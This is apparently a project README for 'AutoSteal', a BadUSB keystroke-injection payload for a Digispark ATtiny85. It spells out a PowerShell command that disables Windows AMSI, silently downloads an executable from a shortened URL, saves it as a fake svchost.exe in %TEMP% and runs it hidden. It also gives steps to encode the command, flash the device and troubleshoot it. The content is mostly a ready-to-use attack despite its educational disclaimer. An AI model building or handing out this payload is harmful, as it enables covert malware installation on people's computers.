# AutoSteal – BadUSB Payload for Digispark (ATtiny85)

This project is an educational example of a malicious USB keyboard payload (BadUSB) using a Digispark ATtiny85. It silently executes a PowerShell command that downloads and runs a remote executable, bypassing basic protections (AMSI) and remaining invisible to the user.

**⚠️ WARNING: This code is provided for educational purposes and authorized penetration testing only. Using it on systems without explicit consent is illegal and unethical. The author assumes no responsibility for any misuse.**

## Features

- **Full stealth**: PowerShell window is hidden (`-W Hidden`)
- **AMSI bypass**: Disables PowerShell's antimalware interface before execution
- **Silent download**: Retrieves an executable from a URL (bit.ly or any other)
- **Background execution**: File is renamed to `svchost.exe` in `%TEMP%` and launched
- **AZERTY support**: Uses the `DigiKeyboardFr` library for French keyboards
- **Memory optimized**: Sketch fits in 6KB flash and uses less than 100 bytes of RAM

## Hardware Required

- A **Digispark ATtiny85** (or compatible clone)
- A USB cable (micro-USB or USB-A)

## Software Requirements

- [Arduino IDE](https://www.arduino.cc/en/software) (version 1.8.x or 2.x)
- **Digispark** board support installed in the IDE
- **DigiKeyboardFr** library (for AZERTY layout)

## Installation & Configuration

### 1. Install Digispark Support in Arduino IDE

1. Open **File → Preferences**.
2. In *Additional Boards Manager URLs*, add:
   ```
   https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json
   ```
3. Go to **Tools → Board → Boards Manager**.
4. Search for **Digistump AVR Boards** and install it.
5. Restart the IDE.

### 2. Install the DigiKeyboardFr Library

- Download the library from [this link](https://github.com/ArminJo/DigistumpArduino/raw/master/libraries/DigisparkKeyboardFr/DigisparkKeyboardFr.zip).
- In the IDE: **Sketch → Include Library → Add .ZIP Library** and select the downloaded file.

  OR :
- Download it from Library Manager in Arduino IDE. 

### 3. The Complete Arduino Sketch

Copy-Paste the content of *AutoSteal.ino*

### 4. Customize the Payload

The sketch currently downloads a file via a bit.ly link (`https://bit.ly/47h8uLI`). To use your own payload:

1. **Host your file** (e.g., `payload.exe`) on an accessible server (GitHub raw, Dropbox, etc.). For Exemple, the actual payload is hosted on this github repo.
2. **Shorten the URL** using a service like bit.ly.
3. **Generate a new base64** of the PowerShell command.

#### PowerShell command structure:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
$a='<YOUR_URL>';
$b='%TEMP%\svchost.exe';
Invoke-WebRequest -Uri $a -OutFile $b;
Start-Process $b
```

#### To generate the base64:

1. Open PowerShell on Windows.
2. Run the following code (replace `<YOUR_URL>` with your actual URL):
   ```powershell
   $cmd = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true);`$a='<YOUR_URL>';`$b='%TEMP%\svchost.exe';Invoke-WebRequest -Uri `$a -OutFile `$b;Start-Process `$b"
   $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
   $encoded = [Convert]::ToBase64String($bytes)
   Write-Host $encoded
   ```
3. Copy the resulting base64 string.
4. Replace the long base64 string in the sketch (the one inside `DigiKeyboardFr.print(F("..."))`).

### 5. Flash the Digispark

1. Plug the Digispark into a USB port.
2. In the Arduino IDE, select:
   - **Board**: *Digispark (Default - 16.5MHz)*
   - **Programmer**: *Micronucleus*
3. Click **Upload**.
4. When the message *"Plug in device now..."* appears, **unplug** then **re-plug** the Digispark.
5. Wait for the upload to complete. You should see:
   ```
   > Starting the user app ...
   running: 100% complete
   >> Micronucleus done. Thank you!
   ```

## How It Works

| Step | Action |
|------|--------|
| 1 | Digispark emulates a USB keyboard |
| 2 | After 2 seconds, it sends **Win+R** to open the Run dialog |
| 3 | It types the base64-encoded PowerShell command |
| 4 | PowerShell runs hidden (`-W Hidden`) with AMSI bypass |
| 5 | The file is downloaded from the specified URL |
| 6 | The file is saved as `%TEMP%\svchost.exe` and executed |
| 7 | The malware runs in the background (self-deletion if programmed) |

## Memory Usage

After compilation, you should see:

```
Sketch uses 3716 bytes (55%) of program storage space. Maximum is 6650 bytes.
Global variables use 97 bytes (18%) of dynamic memory. Maximum is 512 bytes.
```

The sketch is optimized to stay well within the ATtiny85's limited memory.

## Troubleshooting

| Issue | Solution |
|-------|----------|
| The key does nothing | Increase `DigiKeyboardFr.delay(2000)` to `3000` or `4000` |
| PowerShell error on target | Test the URL manually in a browser first |
| Wrong keyboard layout | The sketch uses `DigiKeyboardFr` for AZERTY. For QWERTY, replace with `DigiKeyboard.h` and remove all `Fr` suffixes |
| Memory compilation error | The sketch is already optimized. If errors persist, verify the base64 string is correct |
| Upload fails ("Device not found") | Unplug/re-plug the Digispark exactly when the IDE prompts |

## Legal Disclaimer

This software is provided for educational purposes only. The author is not responsible for any illegal or unauthorized use. Respect applicable laws and only use this code on systems you own or have explicit permission to test.

Dev Notes : 
*Don't be an idiot, don't download Built.exe*
